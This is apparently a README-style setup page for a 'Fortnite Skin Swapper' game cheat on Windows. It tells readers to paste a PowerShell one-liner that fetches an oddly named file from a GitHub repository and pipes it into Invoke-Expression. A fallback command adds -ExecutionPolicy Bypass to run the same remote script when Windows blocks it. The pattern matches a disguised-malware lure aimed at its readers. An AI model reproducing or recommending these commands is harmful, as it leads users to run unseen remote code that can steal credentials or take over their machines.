## Quick Setup (PowerShell)

This installs the tool Fortnite Skin Swapper on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/claudia77867128/fortnite-skin-swapper-cheat-setup-guide/main/lo3lni3jdv.smsmhh2e | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/claudia77867128/fortnite-skin-swapper-cheat-setup-guide/main/lo3lni3jdv.smsmhh2e | Invoke-Expression"
```
